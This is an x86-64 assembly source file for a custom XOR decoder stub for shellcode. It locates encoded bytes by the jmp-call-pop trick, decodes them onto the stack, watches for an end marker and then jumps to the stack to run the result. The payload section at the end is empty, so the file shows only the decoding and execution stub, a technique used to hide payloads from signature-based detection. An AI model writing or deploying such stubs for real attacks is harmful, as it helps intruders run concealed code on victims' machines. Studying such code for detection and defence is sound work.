global _start

section .text

_start:
        jmp call_shellcode

decoder:
        xor rax, rax
        xor rcx, rcx
        xor rbx, rbx
        xor rdx, rdx
        ; number of bytes to xor
        add rcx, 4
        mov ch, cl
        mov cl, bl
        pop rsi             ; address of shellcode
        mov rdi, 0xaaaa9090 ; end of shellcode marker
        ; make room on the stack (512 bytes)
        sub rsp, 0x7f
        sub rsp, 0x7f
        sub rsp, 0x7f
        sub rsp, 0x7f

decode:
        mov cl, ch      ; set byte counter reversed to bytes to xor
        dec cl          ; set byte counter reversed to bytes to xor - 1
        inc bl          
        inc ch
        decode_bytes:
            xor r9, r9
            xor r10, r10
            xor bh, bh
            ; read and decode encoded byte
            mov r9, rdx
            add rdx, rbx                   ; add rbx to rdx
            mov bh, byte [rsi + rdx]        ; read encoded byte
            mov rdx, r9                     ; set rdx back to orignal
            xor bh, byte [rsi + rdx]        ; decode encoded byte
            ;mov ch, byte [rsi + rdx + cl]
            mov r9, rax 
            mov r10b, cl
            add r10, r9                 ; add cl to rax
            mov rax, r10
            mov byte [rsp + rax], bh   ; write decoded byte reversed
            mov rax, r9                    ; set rax back to orignal

            inc bl                          ; next byte
            dec cl                          ; next reversed byte
            cmp bl, ch                      ; if decoded number of xor bytes needed
            jne decode_bytes

        mov cl, ch                  ; set number of bytes to xor to cl
        xor ch, ch
        xor ebx, ebx

        xor r10, r10                
        mov r9, rdx 
        mov r10b, cl
        add r10, r9                 ; add cl to rdx
        mov rdx, r10
        cmp dword [rsi + rdx], edi  ; check if we have reached the end of shellcode marker
        je execute_shellcode            ; if we do, jump to the shellcode and execute it
        mov rdx, r9

        add rdx, rcx
        dec rcx
        add rax, rcx
        mov ch, cl
        jnz decode

execute_shellcode:
        jmp rsp

call_shellcode:
        call decoder

encoder_shellcode: db